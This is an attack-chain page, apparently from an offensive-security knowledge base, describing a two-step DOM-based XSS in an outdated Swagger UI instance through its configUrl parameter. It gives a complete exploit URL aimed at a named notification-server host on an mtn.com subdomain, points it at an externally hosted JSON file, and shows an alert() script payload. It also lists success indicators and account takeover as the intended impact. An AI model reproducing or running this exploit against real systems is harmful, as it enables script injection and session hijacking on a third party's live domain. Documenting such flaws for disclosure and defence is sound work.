---
id: a1b2c3d4-e5f6-7890-abcd-ef1234567890
name: DOM-based Reflected XSS in Swagger UI via Malicious configUrl
tags:
  - xss
  - dom-based
  - swagger-ui
  - javascript-injection
type: attack_chain
tools: []
tactics:
  - '[[Initial Access]]'
  - '[[Execution]]'
verified: false
platforms:
  - Web
submitted: true
complexity: low
created_at: '2023-10-01T00:00:00Z'
procedures:
  - '[[procedures/Exploit-DOM-based-XSS-in-Swagger-UI-via-configUrl]]'
step_count: 2
techniques:
  - '[[JavaScript]]'
  - '[[Exploit Public-Facing Application]]'
updated_at: '2025-12-13T23:55:37.990Z'
description: >-
  A multi-stage attack exploiting a DOM-based reflected XSS vulnerability in an
  outdated Swagger UI instance on a notification server, allowing arbitrary
  JavaScript execution via an unsanitized configUrl parameter.
skill_level: intermediate
impact_level: high
validated: true
mitre_tactics:
  - '[[Initial Access]]'
  - '[[Execution]]'
mitre_techniques:
  - '[[JavaScript]]'
  - '[[Exploit Public-Facing Application]]'
---
# DOM-based Reflected XSS in Swagger UI via Malicious configUrl

Multi-stage attack chain demonstrating exploitation of a DOM-based reflected XSS vulnerability in Swagger UI, leading to arbitrary JavaScript execution and potential account takeovers on *.mtn.com domains.

## Chain Metrics Dashboard

| Metric | Value |
|--------|-------|
| Chain Status | Unverified |
| Total Steps | 2 |
| Execution Time | ~1 minutes |
| Skill Level | Intermediate |
| Complexity | Low |
| Impact Level | High |

## Attack Flow Visualization

```mermaid
graph LR
    A[Initial Access via Malicious URL] --> B[Script Execution and Verification]
    B --> C[Potential Impact: Account Takeover]

    style A fill:#e74c3c
    style B fill:#f39c12
    style C fill:#27ae60
```

## Prerequisites & Requirements

### Required Tools

- Web browser (e.g., Chrome, Firefox)

### Target Environment

- Web platform with Swagger UI deployed
- Accessible notification server endpoint
- Outdated Swagger UI version vulnerable to configUrl manipulation

### Initial Access Requirements

- Public network access to the target URL
- No credentials required for initial exploitation
- Ability to host external JSON files (e.g., via free hosting services like Surge.sh)

## Detailed Attack Procedures

### Step 1: Navigate to Vulnerable Endpoint with Malicious configUrl
procedure: [[procedures/Exploit-DOM-based-XSS-in-Swagger-UI-via-configUrl]]

**Objective**: Load the Swagger UI page with a manipulated configUrl parameter pointing to a malicious external JSON file, triggering DOM-based XSS.

**Instructions**: Construct the target URL by appending the configUrl parameter to the Swagger UI index.html endpoint. For example, use a browser to navigate to:

https://notification-server-v2.sz-my.mtn.com/index.html?configUrl=https://jumpy-floor.surge.sh/test.json

Replace the external URL with one hosting a JSON file containing malicious JavaScript, such as an alert() payload for testing.

**Expected Output**: The page loads the Swagger UI, fetches the external JSON, and executes the embedded JavaScript in the DOM.

**Success Indicators**:
- Page renders without errors
- Malicious script begins processing (e.g., network requests or DOM modifications)

### Step 2: Verify Script Execution
procedure: [[procedures/Exploit-DOM-based-XSS-in-Swagger-UI-via-configUrl]]

**Objective**: Confirm successful XSS by observing the effects of the injected script, such as a popup alert or other indicators of execution.

**Instructions**: After loading the URL from Step 1, monitor the browser for execution indicators. The malicious JSON should trigger an immediate alert popup if using a simple payload like {"scripts": ["alert('XSS')"]}.

**Expected Output**: An alert dialog appears in the browser, or console logs show script execution.

**Success Indicators**:
- Alert popup or console message confirming injection
- No CSP or sanitization blocks the execution

## Attack Chain Summary

### Key Achievements

1. Identified and exploited outdated Swagger UI for DOM-based XSS
2. Demonstrated arbitrary JavaScript execution via external JSON loading
3. Highlighted potential for session hijacking or account takeovers on *.mtn.com

## Technique & Tactic Coverage

### MITRE ATT&CK Techniques

- [[JavaScript]]
- [[Exploit Public-Facing Application]]

### MITRE ATT&CK Tactics

- [[Initial Access]]
- [[Execution]]

---
*Last updated: 2023-10-01T00:00:00Z*
